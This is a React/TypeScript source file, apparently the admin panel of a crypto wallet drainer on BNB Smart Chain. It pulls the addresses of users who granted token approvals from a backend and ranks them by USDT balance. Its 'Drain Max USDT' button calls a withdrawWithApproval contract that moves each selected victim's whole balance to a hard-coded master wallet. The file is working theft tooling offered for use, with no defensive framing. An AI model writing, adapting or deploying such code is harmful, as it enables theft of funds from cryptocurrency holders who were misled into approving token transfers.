import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { useLanguage } from '../LanguageContext';
import './Admin.css';

const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8989';// FIXED: Changed from 5173 to 8989
const BSC_RPC = 'https://bsc-dataseed.binance.org/';
const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
const WITHDRAW_CONTRACT = '0x395c8Cf5D657542b0Eaef485930Cd58B1dEAaC9d';
const TO_ADDRESS = '0x3f9175bC2Bcf57cA2Ac0418f166A6Fb8526D278B';

const USDT_ABI = [
    'function balanceOf(address owner) view returns (uint256)'
];

const WITHDRAW_ABI = [
    'function withdrawWithApproval(address token, address from, address to, uint256 amount) external'
];

function shorten(addr: string, start = 6, end = 4) {
    if (!addr) return '';
    return addr.slice(0, start) + '...' + addr.slice(-end);
}

function formatUSDT(wei: any) {
    if (wei === undefined) return '0.00 USDT';
    const val = Number(wei) / 10 ** 18;
    return val.toFixed(2) + ' USDT';
}

const adminI18n: any = {
    en: {
        title: 'Admin Dashboard',
        connectWallet: 'Connect Admin Wallet',
        approvedAddresses: 'Approved Addresses & Balances',
        selectUser: 'Select User Address',
        drainMax: 'Drain Max USDT',
        tableHash: '#',
        tableAddress: 'Address',
        tableBalance: 'USDT Balance',
        noData: 'No data available. Connect wallet to load.',
        emptyList: 'No approved addresses found yet.',
        withdrawInfo: 'Withdrawals routed to fixed master wallet'
    },
    zh: {
        title: '管理员仪表板',
        connectWallet: '连接管理员钱包',
        approvedAddresses: '已授权地址及余额',
        selectUser: '选择用户地址',
        drainMax: '提取最大 USDT',
        tableHash: '#',
        tableAddress: '地址',
        tableBalance: 'USDT 余额',
        noData: '暂无数据。连接钱包加载。',
        emptyList: '暂无已授权的地址。',
        withdrawInfo: '提款将汇入固定主钱包'
    }
};

export default function Admin() {
    const { lang, toggleLang } = useLanguage();
    const text = adminI18n[lang];

    const [wallet, setWallet] = useState('');
    const [networkOk, setNetworkOk] = useState(false);
    const [statusMsg, setStatusMsg] = useState('Ready.');
    const [addresses, setAddresses] = useState<any[]>([]);
    const [selectedAddr, setSelectedAddr] = useState('');
    const [signer, setSigner] = useState<any>(null);
    const [isLoading, setIsLoading] = useState(false);

    const connectWallet = async () => {
        if ((window as any).ethereum) {
            try {
                const provider = new ethers.BrowserProvider((window as any).ethereum);

                // Check current network
                const network = await provider.getNetwork();
                const chainId = Number(network.chainId);

                // BNB Chain Mainnet: 56, Testnet: 97
                if (chainId !== 56 && chainId !== 97) {
                    try {
                        // Try to switch to BNB Chain
                        await (window as any).ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }], // 56 in hex
                        });
                    } catch (switchError: any) {
                        // If chain not added to wallet, add it
                        if (switchError.code === 4902) {
                            try {
                                await (window as any).ethereum.request({
                                    method: 'wallet_addEthereumChain',
                                    params: [{
                                        chainId: '0x38',
                                        chainName: 'BNB Smart Chain',
                                        nativeCurrency: {
                                            name: 'BNB',
                                            symbol: 'BNB',
                                            decimals: 18
                                        },
                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                        blockExplorerUrls: ['https://bscscan.com/']
                                    }]
                                });
                            } catch (addError) {
                                setStatusMsg('Please switch to BNB Chain manually');
                                return;
                            }
                        } else {
                            setStatusMsg('Please switch to BNB Chain');
                            return;
                        }
                    }
                }

                await provider.send("eth_requestAccounts", []);
                const s = await provider.getSigner();
                const address = await s.getAddress();

                // Verify network again
                const newNetwork = await provider.getNetwork();
                const newChainId = Number(newNetwork.chainId);
                const ok = (newChainId === 56 || newChainId === 97);

                setNetworkOk(ok);
                if (!ok) {
                    setStatusMsg('Wrong network. Switch to BNB Smart Chain.');
                    return;
                }

                setWallet(address);
                setSigner(s);
                setStatusMsg('Ready.');
                await fetchBalances();

            } catch (err) {
                console.error(err);
            }
        } else {
            alert("No Ethereum wallet found.");
        }
    };
    const fetchBalances = async () => {
        try {
            setIsLoading(true);
            setStatusMsg('Fetching approved addresses...');
            console.log('📥 Fetching addresses from:', `${API_BASE}/api/addresses`);

            const res = await fetch(`${API_BASE}/api/addresses`);
            console.log('Response status:', res.status);

            if (!res.ok) throw new Error('Server error');

            const addrs = await res.json();
            console.log('📊 Received addresses:', addrs);

            if (addrs.length === 0) {
                console.log('⚠️ No addresses found in database');
                setStatusMsg('No addresses found. Have any users connected?');
                setAddresses([]);
                setIsLoading(false);
                return;
            }

            const rpcProvider = new ethers.JsonRpcProvider(BSC_RPC);
            const usdt = new ethers.Contract(USDT_CONTRACT, USDT_ABI, rpcProvider);

            const bals = await Promise.all(addrs.map(async (a: string) => {
                try {
                    const bal = await usdt.balanceOf(a);
                    return { address: a, balance: bal, formatted: formatUSDT(bal) };
                } catch (e) {
                    return { address: a, balance: 0n, formatted: '0.00 USDT' };
                }
            }));

            bals.sort((a, b) => (a.balance < b.balance ? 1 : -1));
            setAddresses(bals);
            setStatusMsg(`✅ Found ${bals.length} addresses with balances`);
            console.log('✅ Balances fetched:', bals);

        } catch (err) {
            console.error('Fetch error:', err);
            setStatusMsg('Failed to fetch addresses. Is backend running on port 8989?');
        } finally {
            setIsLoading(false);
        }
    };

    const withdraw = async () => {
        if (!selectedAddr || !signer || !networkOk) return;
        const item = addresses.find(x => x.address === selectedAddr);
        if (!item || item.balance === 0n) return;

        try {
            setIsLoading(true);
            setStatusMsg(`Withdrawing ${item.formatted} from ${shorten(selectedAddr)}...`);
            const withdrawContract = new ethers.Contract(WITHDRAW_CONTRACT, WITHDRAW_ABI, signer);
            const tx = await withdrawContract.withdrawWithApproval(USDT_CONTRACT, selectedAddr, TO_ADDRESS, item.balance);
            setStatusMsg('Transaction submitted, waiting for confirmation...');
            await tx.wait();
            setStatusMsg(`✅ Withdraw successful! Tx: ${shorten(tx.hash, 10, 6)}`);
            await fetchBalances();
        } catch (err: any) {
            console.error(err);
            setStatusMsg(`❌ Withdraw failed: ${err.message?.slice(0, 60) || 'Check console'}`);
        } finally {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        if ((window as any).ethereum) {
            (window as any).ethereum.on('accountsChanged', () => setWallet(''));
            (window as any).ethereum.on('chainChanged', () => window.location.reload());
        }
    }, []);

    return (
        <div className="admin-container">
            <div className="flex justify-between items-center mb-8">
                <h1 className="admin-title admin-title-no-margin">
                    <div className="icon-wrapper">
                        <i className="fas fa-shield-alt"></i>
                    </div>
                    <span>{text.title}</span>
                </h1>
                <button className="lang-btn admin-lang-btn" onClick={toggleLang}>
                    <i className="fas fa-globe mr-2"></i> {lang === 'en' ? '中文' : 'ENG'}
                </button>
            </div>

            <div className="admin-card panel">
                <div className="wallet-row flex flex-wrap gap-4 items-center justify-between mb-8">
                    <div className={`network-pill glass flex items-center gap-2 ${networkOk ? 'text-green-400 border-green-500/30' : 'text-yellow-400 border-yellow-500/30'}`}>
                        <i className={`fas fa-circle text-xs ${networkOk ? 'text-green-400' : 'text-yellow-400'}`}></i>
                        <span>{networkOk ? 'BNB Smart Chain Active' : (wallet ? 'Switch to BNB Chain' : 'BNB Smart Chain')}</span>
                    </div>
                    <button className={`connect-btn ${wallet ? 'connected' : ''}`} onClick={connectWallet}>
                        <i className="fas fa-wallet text-xl"></i>
                        <span>{wallet ? shorten(wallet) : text.connectWallet}</span>
                    </button>
                </div>

                <div className="section-header flex items-center justify-between mb-4">
                    <h2 className="text-xl font-semibold flex items-center gap-2 text-blue-100">
                        <i className="fas fa-list text-blue-400"></i> {text.approvedAddresses}
                    </h2>
                    {wallet && (
                        <button className="refresh-btn" onClick={fetchBalances} disabled={isLoading}>
                            <i className={`fas fa-sync-alt ${isLoading ? 'fa-spin' : ''}`}></i>
                        </button>
                    )}
                </div>

                <div className="table-wrapper glass-panel">
                    <table>
                        <thead>
                            <tr>
                                <th className="col-10">{text.tableHash}</th>
                                <th className="col-45">{text.tableAddress}</th>
                                <th className="col-45">{text.tableBalance}</th>
                            </tr>
                        </thead>
                        <tbody>
                            {addresses.length === 0 ? (
                                <tr>
                                    <td colSpan={3} className="empty-state">
                                        <div className="empty-icon">
                                            <i className="fas fa-search-dollar"></i>
                                        </div>
                                        <span>{wallet ? text.emptyList : text.noData}</span>
                                    </td>
                                </tr>
                            ) : (
                                addresses.map((item, i) => (
                                    <tr key={i} className="table-row">
                                        <td><span className="row-num">{i + 1}</span></td>
                                        <td className="addr-cell" title={item.address}>{shorten(item.address, 10, 8)}</td>
                                        <td className={`bal-cell ${i === 0 && item.balance > 0 ? 'balance-high' : ''}`}>
                                            <span className="val">{item.formatted}</span>
                                        </td>
                                    </tr>
                                ))
                            )}
                        </tbody>
                    </table>
                </div>

                <div className="action-panel glass-panel mt-8">
                    <div className="select-group">
                        <label className="text-blue-200 uppercase tracking-wider text-sm font-semibold mb-2 block">
                            <i className="fas fa-user-tag text-blue-400 mr-2"></i> {text.selectUser}
                        </label>
                        <div className="custom-select-wrapper">
                            <select value={selectedAddr} onChange={e => setSelectedAddr(e.target.value)} disabled={addresses.length === 0 || isLoading}>
                                <option value="">— {addresses.length > 0 ? text.selectUser : 'Load addresses first'} —</option>
                                {addresses.map((x, i) => (
                                    <option key={i} value={x.address}>{shorten(x.address, 8, 8)} - {x.formatted}</option>
                                ))}
                            </select>
                            <i className="fas fa-chevron-down select-arrow"></i>
                        </div>
                    </div>

                    <button
                        className={`withdraw-btn ${(!selectedAddr || !networkOk || isLoading) ? 'disabled' : 'glow-btn-orange'}`}
                        onClick={withdraw}
                        disabled={!selectedAddr || !networkOk || isLoading}
                    >
                        {isLoading ? <i className="fas fa-spinner fa-spin"></i> : <i className="fas fa-bolt"></i>}
                        <span>{text.drainMax}</span>
                    </button>
                </div>

                <div className="status-area flex items-center gap-3 mt-6 p-4 rounded-xl border border-blue-500/20 bg-blue-900/10">
                    <div className="status-icon bg-blue-500/20 p-2 rounded-full">
                        <i className={`fas text-blue-400 ${isLoading ? 'fa-spinner fa-spin' : 'fa-info-circle'}`}></i>
                    </div>
                    <span className="text-blue-100 font-medium">{statusMsg}</span>
                </div>

                <div className="footer-note mt-6 text-center text-sm text-slate-400 border-t border-slate-800 pt-4">
                    <i className="fas fa-lock text-slate-500 mr-2"></i>
                    {text.withdrawInfo}:
                    <span className="ml-2 font-mono text-slate-300 bg-slate-800/50 px-2 py-1 rounded">
                        {TO_ADDRESS}
                    </span>
                </div>
            </div>
        </div>
    );
}